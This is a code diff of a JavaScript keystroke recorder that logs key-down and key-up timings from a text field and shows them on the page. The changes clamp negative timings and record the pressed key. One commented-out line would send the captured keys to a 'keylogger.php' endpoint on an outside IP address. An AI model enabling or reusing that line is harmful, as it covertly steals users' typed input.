@@ -19,10 +19,7 @@ var newstroke = new Object();
 var downbuffer =[];
 var upbuffer =[];
 
-
  //document.getElementById("demo").value = "";
-
-
 
 document.getElementById("text").onkeydown = function(e) {
 
@@ -73,6 +70,12 @@ document.getElementById("text").onkeyup = function(e) {
         var up = upbuffer.shift();
         var down = downbuffer.shift();
         var ftime=-(oldstroke.time-down.time);
+        if (ftime<0)
+        {
+            ftime=0;
+        }
+
+
 
         oldstroke=up;
 
@@ -80,7 +83,7 @@ document.getElementById("text").onkeyup = function(e) {
         var kftime=ftime+time;
         var stroke=new Object();
         
-        stroke.key=up.key;
+        stroke.key=down.key;
         stroke.kftime=kftime;
         //console.log(JSON.stringify(newstroke));
         stroke.time=time;
@@ -95,9 +98,7 @@ document.getElementById("text").onkeyup = function(e) {
 
     window.setInterval(function(){
     //new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
- 
         document.getElementById("demo").innerHTML = JSON.stringify(buffer);
-  
 
     }, 1000);
 
